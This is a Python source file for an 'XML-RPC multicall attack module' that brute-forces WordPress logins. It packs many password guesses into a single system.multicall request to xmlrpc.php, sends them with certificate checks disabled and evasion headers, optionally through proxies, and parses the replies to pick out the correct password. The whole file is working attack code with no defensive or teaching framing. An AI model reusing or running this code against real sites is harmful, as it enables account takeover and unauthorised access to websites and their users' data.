"""XML-RPC multicall attack module — correct parse logic"""
import requests
import xml.etree.ElementTree as ET
from evasion.useragent import get_headers


class XmlRpcAttack:
    def __init__(self, url, timeout=30):
        self.url = f"{url.rstrip('/')}/xmlrpc.php"
        self.timeout = timeout

    def build_payload(self, username, passwords):
        calls = ""
        for pwd in passwords:
            pwd_safe = (pwd.replace("&", "&amp;").replace("<", "&lt;")
                        .replace(">", "&gt;").replace("'", "&apos;")
                        .replace('"', "&quot;"))
            calls += f"""<value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>{username}</string></value>
          <value><string>{pwd_safe}</string></value>
        </data></array></value></member>
      </struct></value>\n"""
        return f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>{calls}</data></array></value></param></params>
</methodCall>"""

    def send_batch(self, username, passwords, proxies=None):
        """Send batch, return successful password if found"""
        payload = self.build_payload(username, passwords)
        try:
            resp = requests.post(
                self.url,
                data=payload.encode('utf-8'),
                headers=get_headers({"Content-Type": "text/xml"}),
                timeout=self.timeout,
                verify=False,
                proxies=proxies
            )
            return resp.status_code, resp.text
        except requests.exceptions.Timeout:
            return -1, "timeout"
        except requests.exceptions.ConnectionError:
            return -2, "connection_error"
        except Exception as e:
            return -3, str(e)

    def parse_response(self, xml_text, passwords):
        """Correct parse logic — no false positives"""
        try:
            root = ET.fromstring(xml_text)

            # Fault response (entire batch rejected)
            fault = root.find('.//fault')
            if fault is not None:
                return None

            # Multicall response: values under params/param/value/array/data
            outer_data = root.find('./params/param/value/array/data')
            if outer_data is None:
                return None

            children = list(outer_data)
            for i, child in enumerate(children):
                if i >= len(passwords):
                    break

                # Each child is a <value> — what is inside?
                struct = child.find('struct')
                if struct is not None:
                    # struct varsa: faultCode kontrol et
                    has_fault = False
                    for member in struct.findall('member'):
                        name_el = member.find('name')
                        if name_el is not None and name_el.text == 'faultCode':
                            has_fault = True
                            break
                    if has_fault:
                        continue  # wrong password

                # struct yoksa veya faultCode yoksa:
                # Success = <value><array><data>..blog info..</data></array></value>
                inner_array = child.find('array')
                if inner_array is not None:
                    # Array found → blog list returned → PASSWORD CORRECT
                    return passwords[i]

            return None

        except ET.ParseError:
            return None
